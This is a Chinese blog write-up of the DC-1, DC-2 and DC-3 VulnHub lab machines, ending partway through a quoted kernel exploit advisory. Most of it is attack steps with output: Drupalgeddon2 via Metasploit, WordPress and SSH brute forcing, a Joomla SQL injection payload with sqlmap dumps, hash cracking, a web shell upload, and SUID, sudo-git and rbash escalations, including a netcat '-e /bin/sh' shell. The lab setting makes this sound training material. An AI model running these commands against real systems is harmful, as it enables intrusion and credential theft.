## DC1

### [](https://lnng.top/posts/2ea3.html#%E6%96%87%E7%AB%A0%E5%89%8D%E6%8F%90%E6%A6%82%E8%BF%B0 "文章前提概述")文章前提概述

本文介绍DC-1靶机的渗透测试流程  
涉及知识点(比较基础):  
nmap扫描网段端口服务  
msf的漏洞搜索  
drupal7的命令执行利用  
netcat反向shell  
mysql的基本操作  
sudi提权

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA "基本环境搭建")基本环境搭建

靶机下载地址:[http://www.five86.com/downloads/DC-1.zip](http://www.five86.com/downloads/DC-1.zip)  
[https://download.vulnhub.com/dc/DC-1.zip](https://download.vulnhub.com/dc/DC-1.zip)  
VMware（windows）:[https://www.52pojie.cn/thread-1026907-1-1.html](https://www.52pojie.cn/thread-1026907-1-1.html)  
选择高版本的vmware，不然可能不支持ova导入  
下载导入开机vmware设置选择nat模式，目的让你的攻击机和靶机在一个网段，可以根据网络环境自行设置只要在一个网段就行。

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86 "基础信息收集")基础信息收集

#### [](https://lnng.top/posts/2ea3.html#nmap%E6%89%AB%E6%8F%8F "nmap扫描")nmap扫描

```
nmap -A 192.168.124.0/24
```

扫描结果  
开发80，111，22ssh端口

```
Host is up (0.00039s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37454/udp   status
|   100024  1          39208/udp6  status
|   100024  1          52048/tcp   status
|_  100024  1          57763/tcp6  status
MAC Address: 00:0C:29:A6:59:A3 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms 192.168.124.145
```

#### [](https://lnng.top/posts/2ea3.html#%E5%85%88%E7%88%86%E7%A0%B4%E4%B8%80%E4%B8%8Bssh%E5%90%A7-%E6%97%A0%E7%BB%93%E6%9E%9C "先爆破一下ssh吧(无结果)")先爆破一下ssh吧(无结果)

```
nmap --script=ssh-brute 192.168.124.145
```

![upload successful](https://lnng.top/images/pasted-107.png)

**upload successful**

#### [](https://lnng.top/posts/2ea3.html#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3 "访问80端口")访问80端口

![upload successful](https://lnng.top/images/pasted-108.png)

**upload successful**

  
尝试了注册，登录的弱密码，修改密码，无效，但发现admin用户存在  
wappalyzer指纹识别，发现室Drupal系统  

![upload successful](https://lnng.top/images/pasted-109.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%8E%BB%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%92%8Cmsf%E6%90%9C%E7%B4%A2%E4%B8%80%E4%B8%8B "去漏洞库和msf搜索一下")去漏洞库和msf搜索一下

```
msfconsole
search Drupal
```

![upload successful](https://lnng.top/images/pasted-110.png)

**upload successful**

![upload successful](https://lnng.top/images/pasted-111.png)

**upload successful**

  
发现有漏洞可以用那就开始msf吧  
使用2018年的漏洞吧，是个远程代码执行(代码审计现在真心看不懂，😔)  
[https://www.exploit-db.com/exploits/44482](https://www.exploit-db.com/exploits/44482)  
[https://paper.seebug.org/567/](https://paper.seebug.org/567/)  

![upload successful](https://lnng.top/images/pasted-112.png)

**upload successful**

#### [](https://lnng.top/posts/2ea3.html#msf%E5%8F%91%E7%8E%B0%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F "msf发现连接成功")msf发现连接成功

```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.124.145
run
```

![upload successful](https://lnng.top/images/pasted-113.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%AF%BB%E6%89%BE%E4%B8%80%E4%B8%8Bflag "寻找一下flag")寻找一下flag

```
shell
find / -name flag*
```

![upload successful](https://lnng.top/images/pasted-114.png)

**upload successful**

```
/home/flag4
/home/flag4/flag4.txt
/var/www/flag1.txt
```

打开flag1.txt试试

```
cat /var/www/flag1.txt
```

![upload successful](https://lnng.top/images/pasted-115.png)

**upload successful**

  
翻译一下:每一个好的CMS都需要一个配置文件–你也一样。  
搜索Drupal的配置文件  
/var/www/sites/default/settings.php，打开

```
cat /var/www/sites/default/settings.php
```

```
*
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

### [](https://lnng.top/posts/2ea3.html#%E5%8F%91%E7%8E%B0%E4%BA%86flag2%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%8C%E5%B0%9D%E8%AF%95%E8%BF%9E%E6%8E%A5%E4%B8%80%E4%B8%8B "发现了flag2和数据库的账号密码，尝试连接一下")发现了flag2和数据库的账号密码，尝试连接一下

先弄一下交互shell吧

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![upload successful](https://lnng.top/images/pasted-117.png)

**upload successful**

  
连接数据库尝试一下

```
mysql -u dbuser -p R0ck3t
```

### [](https://lnng.top/posts/2ea3.html#%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8Bnode%E5%92%8Cuser%E8%A1%A8%EF%BC%8C%E5%8F%91%E7%8E%B0flag3 "查看一下node和user表，发现flag3")查看一下node和user表，发现flag3

```
select * from node;
select * from users;
```

![upload successful](https://lnng.top/images/pasted-118.png)

**upload successful**

  
为什么要看node表呢？？？(user表就不说了吧)  
因为drupal node机制  
[drupal node机制理解](https://www.cnblogs.com/amw863/p/4551889.html)  
so，尝试获得登录的密码，hash值破解可能不太现实  
我们注册一个账号将二者hash互换不就可以了  
我丢不行，注册没法写密码，  
那找到加密脚本自己加密一个不就行了  
加密脚本位置

scripts/password-hash.sh  

![upload successful](https://lnng.top/images/pasted-119.png)

**upload successful**

```
php scripts/password-hash.sh admin

password: admin                 hash: $S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.
```

尝试更换管理员密码的hash

```
update users set pass='$S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.' where name='admin';
```

![upload successful](https://lnng.top/images/pasted-120.png)

**upload successful**

  
下面登录测试一下,账号admin密码admin  

![upload successful](https://lnng.top/images/pasted-121.png)

**upload successful**

  
在content中发现  

![upload successful](https://lnng.top/images/pasted-122.png)

**upload successful**

  
Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.

### [](https://lnng.top/posts/2ea3.html#%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E5%AF%BB%E6%89%BE%E5%AF%86%E7%A0%81%EF%BC%8C%E8%80%8C%E4%B8%94%E6%8F%90%E7%A4%BAshadow%EF%BC%8C%E4%B9%8B%E5%89%8D%E7%9A%84flag4%E8%BF%98%E6%B2%A1%E7%9C%8B "也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看")也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看

![upload successful](https://lnng.top/images/pasted-123.png)

**upload successful**

  
Can you use this same method to find or access the flag in root?  
Probably. But perhaps it’s not that easy. Or maybe it is?  
应该是让获得管理员权限，再去/etc/shadow看看

![upload successful](https://lnng.top/images/pasted-124.png)

**upload successful**

  
尝试给权限，还是不行  

![upload successful](https://lnng.top/images/pasted-125.png)

**upload successful**

  
那只能尝试提权了

### [](https://lnng.top/posts/2ea3.html#suid%E6%8F%90%E6%9D%83 "suid提权")suid提权

SUID是set uid的简称，它出现在文件所属主权限的执行位上面，标志为 s 。当设置了SUID后，UMSK第一位为4。我们知道，我们账户的密码文件存放在/etc/shadow中，而/etc/shadow的权限为 ———-。也就是说：只有root用户可以对该目录进行操作，而其他用户连查看的权限都没有。当普通用户要修改自己的密码的时候，可以使用passwd这个指令。passwd这个指令在/bin/passwd下，当我们执行这个命令后，就可以修改/etc/shadow下的密码了。那么为什么我们可以通过passwd这个指令去修改一个我们没有权限的文件呢？这里就用到了suid，suid的作用是让执行该命令的用户以该命令拥有者即root的权限去执行，意思是当普通用户执行passwd时会拥有root的权限，这样就可以修改/etc/passwd这个文件了。  
参考文章:[Linux下的用户、组和权限](https://blog.csdn.net/qq_36119192/article/details/82228791#Umask%E3%80%81Suid%E3%80%81Sgid%E3%80%81%E7%B2%98%E6%BB%9E%E4%BD%8D)  
已知的可用来提权的linux可行性的文件列表如下：  
nmap,vim,find,bash,more,less,nano,cp  
发现系统上运行的所有SUID可执行文件

```
不同系统适用于不同的命令
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000-print2>/dev/null
find / -user root -perm -4000-exec ls -ldb {} \;
```

![upload successful](https://lnng.top/images/pasted-126.png)

**upload successful**

  
尝试查看find是否有suid权限

```
/usr/bin/find /tmp -exec whoami  \;
```

find 命令说明  
-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。-exec参数后面跟的就是我们想进一步操作的命令,so，我们可以以root的权限命令执行了

反弹一个shell，当然find和执行命令，我们也可以返回一个root的netcat的后门

```
/usr/bin/find ./aaa -exec '/bin/sh'  \;
```

```
/usr/bin/find ./aaa -exec netcat -lvp 4444 -e "/bin/sh" \;
netcat 192.168.124.145 4444
```

![upload successful](https://lnng.top/images/pasted-127.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-135.png)

**upload successful**

  
最后,获得最后一个flag

```
cat thefinalflag.txt
```

Well done!!!!

Hopefully you’ve enjoyed this and learned some new skills.

You can let me know what you thought of this little journey  
by contacting me via Twitter - @DCAU7

### [](https://lnng.top/posts/2ea3.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0 "参考文章")参考文章

freebuf:[https://www.freebuf.com/articles/network/218073.html](https://www.freebuf.com/articles/network/218073.html)  
知乎:[https://zhuanlan.zhihu.com/p/135342104](https://zhuanlan.zhihu.com/p/135342104)  
W3:[https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640](https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640)

## [](https://lnng.top/posts/2ea3.html#DC2 "DC2")DC2

### [](https://lnng.top/posts/2ea3.html#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA "环境搭建")环境搭建

靶机下载地址:[http://www.five86.com/downloads/DC-2.zip](http://www.five86.com/downloads/DC-2.zip)

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86 "基本信息收集")基本信息收集

nmap基本扫描，发现ip地址192.168.124.146，开发端口80，使用的wordpress框架

```
nmap -A 192.168.124.0/24
```

```
Nmap scan report for dc-2 (192.168.124.146)
Host is up (0.00036s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: DC-2 &#8211; Just another WordPress site
|_https-redirect: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:94:8C:B4 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```

对端口进一步扫描,发现开发了7744端口(不清楚是什么服务，因该是ssh吧)：

```
nmap -sS 192.168.124.146 -p 1-65535
```

```
Nmap scan report for dc-2 (192.168.124.146)
Host is up (0.00094s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu
```

访问192.168.124.146发现访问不了，这里需要改下本地的dns

```
linux:
vim /etc/hosts
windows:
C:\Windows\System32\drivers\etc
```

![upload successful](https://lnng.top/images/pasted-128.png)

**upload successful**

  
访问果然是个wordpress框架  

![upload successful](https://lnng.top/images/pasted-129.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#flag1 "flag1")flag1

发现有flag,点进去，提示用cewl来获取密码，所有应该是爆破密码之类的，且提示自己的密码字典可能无效，且有时没法获得所有密码，提示用其他的身份去登录  

![upload successful](https://lnng.top/images/pasted-130.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E9%82%A3%E8%BF%98%E8%AF%B4%E4%BB%80%E4%B9%88cewl%E6%90%9E%E8%B5%B7 "那还说什么cewl搞起")那还说什么cewl搞起

cewl是通过爬行网站获取关键信息创建一个密码字典

```
cewl http://dc-2/index.php/flag/ -w dict.txt
-w 输出的文件名称
```

发现主题是wordpress，那就扫描一下用户吧，提示密码了，因该是让登录  
使用wpscan工具：

WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。  
该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码。

枚举一下用户,枚举出admin，jerry，tom

```
wpscan --url http://dc-2 --enumerate u
```

```

[+] URL: http://dc-2/ [192.168.124.146]
[+] Started: Sat Nov  7 02:23:05 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
```

爆破一下用户名和密码  
touch users.txt  
将用户名admin，jerry，tom存入  
用刚刚抓取的密码字典和用户字典进行爆破

```
wpscan --url http://dc-2/ -U users.txt -P dict.txt
```

```
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

成功爆破出了两个用户名和密码，没有admin的  

![upload successful](https://lnng.top/images/pasted-131.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%B0%9D%E8%AF%95%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%EF%BC%8C%E4%B8%94%E5%9C%A8page%E4%B8%AD%E5%8F%91%E7%8E%B0flag2 "尝试登录，登录成功，且在page中发现flag2")尝试登录，登录成功，且在page中发现flag2

![upload successful](https://lnng.top/images/pasted-133.png)

**upload successful**

  
提示无法利用wordpress采取捷径，尝试令一种方法，之前nmap扫描出了7744端口，那么我们是不是可以尝试ssh登录  
发现使用tom账号登录成功

```
ssh tom@192.168.124.146 -p 7744
password:parturient
```

### [](https://lnng.top/posts/2ea3.html#%E5%B0%9D%E8%AF%95%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6 "尝试读取文件")尝试读取文件

![upload successful](https://lnng.top/images/pasted-134.png)

**upload successful**

  
发现被rbash，也就是说是被受限的shell  
参考链接:[freebuf](https://www.freebuf.com/articles/system/188989.html)

先尝试”/“能不能用

![upload successful](https://lnng.top/images/pasted-136.png)

**upload successful**

  
cp命令

![upload successful](https://lnng.top/images/pasted-137.png)

**upload successful**

  
FTP,GDB,main,git没有，发现vi可以用，那就试试被

```
vi test
set shell=/bin/sh
shell
```

![upload successful](https://lnng.top/images/pasted-138.png)

**upload successful**

![upload successful](https://lnng.top/images/pasted-139.png)

**upload successful**

![upload successful](https://lnng.top/images/pasted-140.png)

**upload successful**

更改PATH或SHELL环境变量

```
查看
export -p
```

```
export HOME='/home/tom'                                                                                                           
export LANG='en_US.UTF-8'                                                                                                         
export LOGNAME='tom'                                                                                                              
export MAIL='/var/mail/tom'                                                                                                       
export PATH='/home/tom/usr/bin'                                                                                                   
export PWD='/home/tom'
export SHELL='/bin/rbash'
export SHLVL='1'
export SSH_CLIENT='192.168.124.139 51336 7744'
export SSH_CONNECTION='192.168.124.139 51336 192.168.124.146 7744'
export SSH_TTY='/dev/pts/1'
export TERM='xterm-256color'
export USER='tom'
export VIM='/usr/share/vim'
export VIMRUNTIME='/usr/share/vim/vim74'
export _='whoami'
```

修改path

```
export PATH="/usr/sbin:/usr/bin:/rbin:/bin"
```

打开flag3.txt发现，提示要切换用户到jerry  

![upload successful](https://lnng.top/images/pasted-141.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7%EF%BC%8Chome%E5%8F%91%E7%8E%B0flag4 "切换用户，home发现flag4")切换用户，home发现flag4

![upload successful](https://lnng.top/images/pasted-142.png)

**upload successful**

Good to see that you’ve made it this far - but you’re not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you’re on your own now. :-)

Go on - git outta here!!!!

### [](https://lnng.top/posts/2ea3.html#%E8%BF%99%E9%87%8C%E6%8F%90%E7%A4%BAgit%E6%8F%90%E6%9D%83 "这里提示git提权")这里提示git提权

```
sudo git help config
```

![upload successful](https://lnng.top/images/pasted-143.png)

**upload successful**

  
成功获取root权限，读取文件

![upload successful](https://lnng.top/images/pasted-146.png)

**upload successful**

Congratulatons!!!

A special thanks to all those who sent me tweets  
and provided me with feedback - it’s all greatly  
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.

### [](https://lnng.top/posts/2ea3.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-1 "参考文章")参考文章

[linux提权](https://www.cnblogs.com/zaqzzz/p/12075132.html#1suid%E6%8F%90%E6%9D%83)

[freebuf](https://www.freebuf.com/articles/system/188989.html)

[wpscan](https://blog.csdn.net/qq_41453285/article/details/100898310)

[vulnhub: DC 2](https://www.cnblogs.com/yurang/p/12735229.html)

## [](https://lnng.top/posts/2ea3.html#DC3 "DC3")DC3

### [](https://lnng.top/posts/2ea3.html#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA "靶场搭建")靶场搭建

靶场的下载：[http://www.five86.com/downloads/DC-3-2.zip](http://www.five86.com/downloads/DC-3-2.zip)

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1 "基本信息收集")基本信息收集

```
nmap -sS A 192.168.124.0/24
```

```
Nmap scan report for 192.168.124.147
Host is up (0.00041s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
MAC Address: 00:0C:29:EF:73:10 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.124.147
```

对端口的进一步扫描，没有发现其他的端口

```
nmap 192.168.124.147
```

访问192.168.124.147的80端口，发现提示，和cms是joomla  

![upload successful](https://lnng.top/images/pasted-147.png)

**upload successful**

  
使用joomscan进行进一步扫描

它是一个Joomla扫描仪。 它将帮助网络开发人员和网站管理员帮助确定已部署的Joomla网站可能存在的安全漏洞。

```
安装joomscan(kali中)
apt-get install joomscan
joomscan --url http://192.168.124.147
```

![upload successful](https://lnng.top/images/pasted-148.png)

**upload successful**

  
也可使用CMSseek进一步扫描

```
安装CMSseek
git clone https://github.com/Tuhinshubhra/CMSeeK
使用
python3 cmseek.py --url 192.168.124.147
```

信息一样  

![upload successful](https://lnng.top/images/pasted-149.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E6%90%9C%E7%B4%A2joomla%E6%BC%8F%E6%B4%9E "搜索joomla漏洞")搜索joomla漏洞

```
searchsploit joomla 3.7.0
```

![upload successful](https://lnng.top/images/pasted-150.png)

**upload successful**

  
打开查看漏洞详情

```
cat /usr/share/exploitdb/exploits/php/webapps/42033.txt 
```

查看发现存在sql注入，具体漏原理[seebug](https://paper.seebug.org/305/)  
简单来说就是  
com_fields组件，对请求数据没有进行过滤，从而导致sql注入，未过滤位置  

![upload successful](https://lnng.top/images/pasted-152.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-151.png)

**upload successful**

  
测试一下

```
http://192.168.124.147/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),1)
```

![upload successful](https://lnng.top/images/pasted-153.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#sqlmap%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5 "sqlmap进行注入")sqlmap进行注入

```
爆数据库名
sqlmap -u "http://192.168.124.147/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),1)" --dbs
```

![upload successful](https://lnng.top/images/pasted-154.png)

**upload successful**

```
爆表名
qlmap -u "http://192.168.124.147/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),1)" -D "joomladb" --tables
```

![upload successful](https://lnng.top/images/pasted-155.png)

**upload successful**

```
爆字段名
sqlmap -u "http://192.168.124.147/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),1)" -D "joomladb" -T "#__users" --columns
```

![upload successful](https://lnng.top/images/pasted-156.png)

**upload successful**

```
爆数据
sqlmap -u "http://192.168.124.147/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),1)" -D "joomladb" -T "#__users" -C name,password --dump
```

![upload successful](https://lnng.top/images/pasted-157.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%B0%9D%E8%AF%95%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81 "尝试破解密码")尝试破解密码

```
$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```

```
创建文件
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > test
爆破密码
john test
john test --show
```

John the Ripper (“JtR”) 是一个非常有用的工具。这是一个快速的密码破解器，适用于Windows和许多Linux系统。它具有很多功能，对于很多密码破解均有奇效。

![upload successful](https://lnng.top/images/pasted-158.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E7%99%BB%E5%BD%95%E5%86%99shell%E9%A1%B5%E9%9D%A2 "登录写shell页面")登录写shell页面

登录网站:[http://192.168.124.147/administrator/](http://192.168.124.147/administrator/)  
编写新页面  

![upload successful](https://lnng.top/images/pasted-159.png)

**upload successful**

  
点击编写  

![upload successful](https://lnng.top/images/pasted-162.png)

**upload successful**

  
new file编写  

![upload successful](https://lnng.top/images/pasted-163.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-165.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E8%9A%81%E5%89%91%E9%93%BE%E6%8E%A5 "蚁剑链接")蚁剑链接

![upload successful](https://lnng.top/images/pasted-166.png)

**upload successful**

![upload successful](https://lnng.top/images/pasted-167.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83 "尝试提权")尝试提权

尝试suid提权

```
find / -perm -u=s -type f 2>/dev/null
```

发现没有可提权程序

![upload successful](https://lnng.top/images/pasted-168.png)

**upload successful**

  
尝试命令提权，发现咩用  
尝试linux内核提权

```
uname -a
cat /etc/issue
```

![upload successful](https://lnng.top/images/pasted-170.png)

**upload successful**

  
寻找内核提权脚本

```
searchsploit Ubuntu 16.04
```

尝试一下  

![upload successful](https://lnng.top/images/pasted-169.png)

**upload successful**

```
cat \usr\share\exploitdb\exploits\linux\local\39772.txt
```

```
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808

In Linux >=4.4, when the CONFIG_BPF_SYSCALL config option is set and the
kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,
unprivileged code can use the bpf() syscall to load eBPF socket filter programs.
These conditions are fulfilled in Ubuntu 16.04.

When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the first
function that touches the supplied eBPF instructions is
replace_map_fd_with_map_ptr(), which looks for instructions that reference eBPF
map file descriptors and looks up pointers for the corresponding map files.
This is done as follows:

        /* look for pseudo eBPF instructions that access map FDs and
         * replace them with actual map pointers
         */
        static int replace_map_fd_with_map_ptr(struct verifier_env *env)
        {
                struct bpf_insn *insn = env->prog->insnsi;
                int insn_cnt = env->prog->len;
                int i, j;

                for (i = 0; i < insn_cnt; i++, insn++) {
                        [checks for bad instructions]

                        if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) {
                                struct bpf_map *map;
                                struct fd f;

                                [checks for bad instructions]

                                f = fdget(insn->imm);
                                map = __bpf_map_get(f);
                                if (IS_ERR(map)) {
                                        verbose("fd %d is not pointing to valid bpf_map\n",
                                                insn->imm);
                                        fdput(f);
                                        return PTR_ERR(map);
                                }

